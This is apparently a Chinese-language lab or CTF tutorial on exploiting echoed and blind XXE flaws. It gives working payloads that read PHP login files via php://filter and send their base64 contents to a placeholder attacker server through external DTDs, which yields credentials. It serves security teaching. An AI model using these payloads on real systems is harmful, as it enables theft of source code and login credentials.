## 第一题：有回显XXE漏洞利用

![](img/31c3651b660630db43bfe5e9eb7e08a2_22.png)

![](img/31c3651b660630db43bfe5e9eb7e08a2_24.png)

![](img/31c3651b660630db43bfe5e9eb7e08a2_26.png)

![](img/31c3651b660630db43bfe5e9eb7e08a2_27.png)

![](img/31c3651b660630db43bfe5e9eb7e08a2_29.png)

上一节我们介绍了XXE漏洞的基本概念，本节中我们来看看如何利用有回显的XXE漏洞。

![](img/31c3651b660630db43bfe5e9eb7e08a2_31.png)

![](img/31c3651b660630db43bfe5e9eb7e08a2_33.png)

首先，通过抓包分析登录请求，发现请求体为XML格式，并且服务器会将`username`字段的值回显在响应中。这表明存在可被利用的XXE漏洞。

![](img/31c3651b660630db43bfe5e9eb7e08a2_35.png)

![](img/31c3651b660630db43bfe5e9eb7e08a2_37.png)

![](img/31c3651b660630db43bfe5e9eb7e08a2_38.png)

以下是解题的核心步骤：

1.  **探测漏洞**：修改`username`字段，尝试引入外部实体。例如，使用一个指向外部服务器（如ceye.io）的实体，观察外部服务器是否收到请求，以确认漏洞存在。
    ```xml
    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://your-server.ceye.io"> ]>
    <user><username>&xxe;</username><password>123</password></user>
    ```

![](img/31c3651b660630db43bfe5e9eb7e08a2_40.png)

![](img/31c3651b660630db43bfe5e9eb7e08a2_42.png)

![](img/31c3651b660630db43bfe5e9eb7e08a2_43.png)

![](img/31c3651b660630db43bfe5e9eb7e08a2_44.png)

2.  **读取目标文件**：确认漏洞后，目标是读取处理登录逻辑的PHP文件（如`do_login.php`），以获取其中的账户密码。构造Payload读取文件。
    ```xml
    <!DOCTYPE test [
      <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=do_login.php">
      <!ENTITY % dtd SYSTEM "http://your-server.com/evil.dtd">
      %dtd;
    ]>
    <user><username>&send;</username><password>123</password></user>
    ```
    其中，`evil.dtd`文件内容为：
    ```xml
    <!ENTITY % all "<!ENTITY send SYSTEM 'http://your-server.com/?%file;'>">
    %all;
    ```

![](img/31c3651b660630db43bfe5e9eb7e08a2_46.png)

![](img/31c3651b660630db43bfe5e9eb7e08a2_48.png)

![](img/31c3651b660630db43bfe5e9eb7e08a2_50.png)

![](img/31c3651b660630db43bfe5e9eb7e08a2_51.png)

![](img/31c3651b660630db43bfe5e9eb7e08a2_52.png)

3.  **解码获取信息**：服务器解析Payload后，会将Base64编码的文件内容通过HTTP请求发送到我们的服务器。在访问日志中获取编码数据，解码后即可得到文件源码，从而找到账户密码完成登录。

## 第二题：无回显XXE漏洞利用

解决了有回显的情况后，我们面临一个更常见的场景：无回显XXE。服务器在处理后只返回成功或失败的状态码，不返回具体数据。

![](img/31c3651b660630db43bfe5e9eb7e08a2_56.png)

![](img/31c3651b660630db43bfe5e9eb7e08a2_57.png)

![](img/31c3651b660630db43bfe5e9eb7e08a2_59.png)

![](img/31c3651b660630db43bfe5e9eb7e08a2_61.png)

解题思路与有回显类似，核心区别在于**数据外带**的方式。由于没有直接回显，我们必须通过让服务器访问我们控制的网址，将数据附加在URL中带出来。

以下是关键步骤和注意事项：

![](img/31c3651b660630db43bfe5e9eb7e08a2_63.png)

![](img/31c3651b660630db43bfe5e9eb7e08a2_65.png)

1.  **基本判断**：抓包发现响应中无`username`等数据的回显，只有表示成功（code=1）或失败（code=0）的状态码。这属于无回显（Blind XXE）场景。

![](img/31c3651b660630db43bfe5e9eb7e08a2_67.png)

2.  **构造外带Payload**：需要准备一个存放在自己公网服务器上的DTD文件，并在XML中引用它。
    *   **主Payload**（发送给靶场）：
        ```xml
        <!DOCTYPE test [
          <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=do_login2.php">
          <!ENTITY % dtd SYSTEM "http://your-public-ip/xxe/evil2.dtd">
          %dtd;
          %send;
        ]>
        <user><username>test</username><password>123</password></user>
        ```
    *   **服务器上的DTD文件** (`evil2.dtd`)：
        ```xml
        <!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://your-public-ip/xxe/?%file;'>">
        %all;
        ```

![](img/31c3651b660630db43bfe5e9eb7e08a2_69.png)

![](img/31c3651b660630db43bfe5e9eb7e08a2_71.png)

![](img/31c3651b660630db43bfe5e9eb7e08a2_72.png)

![](img/31c3651b660630db43bfe5e9eb7e08a2_74.png)

3.  **常见错误分析**：在操作过程中，初学者常遇到以下问题：
    *   **DTD文件路径错误**：`SYSTEM`实体引用的必须是靶场服务器能访问到的**公网URL**，不能是`localhost`或内网地址。
    *   **协议使用错误**：在读取文件时，`resource=`后面直接跟文件路径（如`do_login2.php`），**不需要**也不能加`http://`前缀。
    *   **Payload格式错误**：注意参数实体（`%`）和普通实体（`&`）的声明与引用方式，确保DTD文件中的嵌套声明格式正确。

![](img/31c3651b660630db43bfe5e9eb7e08a2_76.png)

![](img/31c3651b660630db43bfe5e9eb7e08a2_78.png)

4.  **获取结果**：将构造好的Payload发送后，查看自己服务器的Web访问日志（如Apache的`access.log`），可以发现其中包含了靶场服务器发来的请求，其URL参数中即携带了Base64编码的目标文件内容。解码后即可获得凭证。

## 总结

![](img/31c3651b660630db43bfe5e9eb7e08a2_80.png)

![](img/31c3651b660630db43bfe5e9eb7e08a2_81.png)

本节课中我们一起学习了XXE漏洞在两种不同场景下的实战应用。

*   **有回显XXE**：利用简单直接，通过外部实体引用将目标文件内容在响应中回显出来。
*   **无回显XXE**：需要结合**外部DTD文件**和**参数实体**，通过触发HTTP请求将数据外带到可控服务器的日志中。

![](img/31c3651b660630db43bfe5e9eb7e08a2_83.png)

核心在于理解XML解析器处理外部实体的过程，并灵活运用`php://filter`协议进行文件读取，以及通过构造网络请求实现数据外带。请务必注意Payload中所有URL地址都必须可从靶场环境公开访问。
